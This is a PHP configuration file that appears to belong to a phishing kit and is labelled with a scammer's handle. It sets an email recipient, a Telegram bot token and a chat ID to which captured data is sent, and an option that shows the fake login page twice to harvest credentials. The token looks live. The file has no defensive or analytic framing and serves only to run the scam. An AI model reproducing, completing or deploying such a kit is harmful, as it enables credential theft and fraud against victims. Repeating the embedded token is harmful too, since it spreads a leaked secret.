<?php
session_start();
error_reporting(0);
//Send to telegram 
$scamname = "@devpro1"; //
//Telegram Bot Token
$to = "YOUR-EMAIL@DOMAINE.COM"; 	 // Edit this to your email 
//Telegram Bot Token
$TGBOT = '6893237464:AAF2SPrA-tTlEMXYi12PwJH3MvEq7PoeW3c';
//Telegram ChatID
$CHATID = '5739060704';
//Login page twice
$_SESSION['LOGINTWICE'] = 0; // 1 > login page once and 0 > login page twice 


$_SESSION['SENDTG'] = '1';
$_SESSION['SEND'] = $to;
$_SESSION['TGBOT'] = $TGBOT;
$_SESSION['CHATID'] = $CHATID;






?>